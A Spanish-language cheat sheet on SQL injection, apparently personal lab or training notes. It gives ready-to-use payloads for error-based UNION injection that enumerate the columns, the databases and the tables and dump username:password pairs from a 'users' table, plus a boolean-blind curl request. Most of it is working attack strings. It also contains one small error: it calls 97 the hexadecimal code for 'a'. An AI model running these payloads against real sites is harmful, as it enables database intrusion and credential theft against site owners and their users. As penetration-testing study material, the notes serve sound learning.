-----
+ tags: #sql #sqli #sqlmap #web 
-----

----------------------==Información==--------------------
La idea es insertar código en la cosulta a la base de datos. Si la consulta se hace así: '$id', hará falta insertar una comilla para escapar,
sin embargo **si no hay comillas no hará falta!!!**


# Error Based

> Las inyecciones Error Based permiten ver el error en la query al realizar la inyección SQL.

## Procedimiento:
### Descubrir el número de columnas
	?id=3' order by 100-- -
	?id=3' order by 50-- -
	?id=3' order by 20-- -
	?id=3' order by 10-- -
	?id=3' order by 1-- -
*Cuando hagamos coincidir el número de columnas con el real, la respuesta cambiará*

### Seleccionar las columnas que existen
- Lo que buscamos aquí es seleccionar las columnas que hayan para poder sustituir más tarde dichos valores por otros.

*En el siguiente ejemplo simulamos que hemos encontrado 5 columnas:*

	?id=3' union select 1,2,3,4,5-- -

*Si utilizando la query anterior no vemos nada raro, podemos cambiar el 3 por un valor que no exista en la base de datos:*

	?id=123456' union select 1,2,3,4,5-- -


### Extracción de la información
Ahora nos queda extraer la información, se pueden probar varias cosas:


#### Base de datos en uso

	database()


#### Ver bases de datos existentes

	schema_name from information_schema.schemata 

*SI hay mas bases de datos que columnas por las que filtrar, no podrán mostrarse todas las bases de datos de esta manera. Ver Alternativa*

#### Ver bases de datos existentes (Alternativa)

	schema_name from information_schema.schemata limit 0,1
	schema_name from information_schema.schemata limit 1,1
	schema_name from information_schema.schemata limit 2,1

#### Ver bases de datos existentes (Alternativa 2 (Más recomendable))
	?id=123456' union select group_concat(schema_name) from information_schema.schemata-- -


#### Ver tablas existentes
	?id=123456' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4U'-- -

	(Respuesta: users)

#### Ver columnas existentes
	?id=123456' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4U' and table_name='users'-- -

	(Respuesta: id,username,password)

#### Ver columnas existentes (Alternativa si la base de datos es la que esta en uso)
	?id=123456' union select group_concat(column_name)


#### Ver valores de las columnas
	?id=123456' union select group_concat(username) from Hack4U.users-- -
	?id=123456' union select group_concat(username,0x3a,password) from Hack4U.users-- -

#### Ver valores de las columnas (Alternativa si la base de datos es la que esta en uso)
	?id=123456' union select group_concat(username) from users-- -
	?id=123456' union select group_concat(username,0x3a,password) from users-- -



# Non-Error Based

> Las inyecciones Non-Error Based no permiten ver el error en la query al realizar la inyección SQL.

## Procedimiento:
### Descubrir el número de columnas
	?id=3' order by 100-- -
	?id=3' order by 50-- -
	?id=3' order by 20-- -
	?id=3' order by 10-- -
	?id=3' order by 1-- -
	
*Cuando hagamos coincidir el número de columnas con el real, la respuesta cambiará*



# Blind 

## Boolean Based

	curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=97)"

97 es 'a' en hexadecimal. El primer usuario es admin y por lo tanto el primer caracter es 'a', por lo que la respuesta será código de estado 200, 1, TRUE...











